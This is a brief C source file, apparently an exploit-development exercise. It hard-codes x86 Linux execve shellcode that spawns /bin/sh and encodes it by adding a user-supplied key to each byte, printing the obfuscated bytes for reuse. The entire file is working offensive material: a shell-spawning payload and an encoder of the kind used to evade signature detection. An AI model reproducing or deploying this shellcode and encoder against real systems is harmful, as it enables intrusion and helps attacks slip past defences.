#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
main(int argc, char **argv)
{
        int i;
      	unsigned char string[] = "\x31\xc0\x50\x31\xdb\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x53\x89\xe2\xb0\x0b\xcd\x80"; //our execve shellcode
        
	unsigned char encrypted_string[strlen(string)]; 

        unsigned char code[strlen(string)];
        char *key_ch;
        char key_int;
       
        key_ch = argv[1];
        key_int = atoi(key_ch);
        

        if (strcmp(argv[2], "encrypt") == 0)
        {
                i = 0;
                while(i <= strlen(string)-1)
                {
                        encrypted_string[i] = string[i]+ key_int;
                        i++;
                }
               
                printf("\nEncrypted String:\n ");
                i = 0;
                while (i <= strlen(string)-1 )
                {      
                        printf("\\x%02x", encrypted_string[i]);
                        i++;
                }
		printf("\n\nLength of encrypted string is: %d",strlen(encrypted_string));
                printf("\n");
        }

}
